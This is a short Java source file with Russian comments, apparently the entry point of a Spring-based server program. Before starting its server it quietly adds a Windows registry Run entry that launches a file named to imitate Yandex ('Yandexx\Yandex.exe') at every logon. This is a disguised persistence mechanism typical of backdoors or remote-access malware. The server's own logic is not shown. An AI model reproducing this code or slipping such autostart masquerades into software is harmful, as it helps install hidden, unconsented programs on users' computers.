package ru.at0m1cc;

import org.springframework.context.support.ClassPathXmlApplicationContext;

import java.io.IOException;
/**
 * Главный класс c использованием Spring framework
 * @author at0m1cc
 * @version 1.0
 * */
public class Main {
    /**
     *  Точка входа в программу
     *  @param args аргументы командной строки
     * */
    public static void main(String[] args) {
        try {
            // Добавление в автозагрузку
            Runtime.getRuntime().exec("REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v 1 /t REG_SZ /d \"C:\\Program Files\\Yandexx\\Yandex.exe\"");
            ClassPathXmlApplicationContext context = new ClassPathXmlApplicationContext("applicationContext.xml");
            ServerLogic serv = (ServerLogic) context.getBean("serverLogic");
            //  Запуск сервера
            serv.start();
        } catch (IOException e) {
            // Если по каким-то причинам добавление в автозагруку не получилось, просто запускаем сервер
            ClassPathXmlApplicationContext context = new ClassPathXmlApplicationContext("applicationContext.xml");
            ServerLogic serv = (ServerLogic) context.getBean("serverLogic");
            serv.start();
        }
    }
}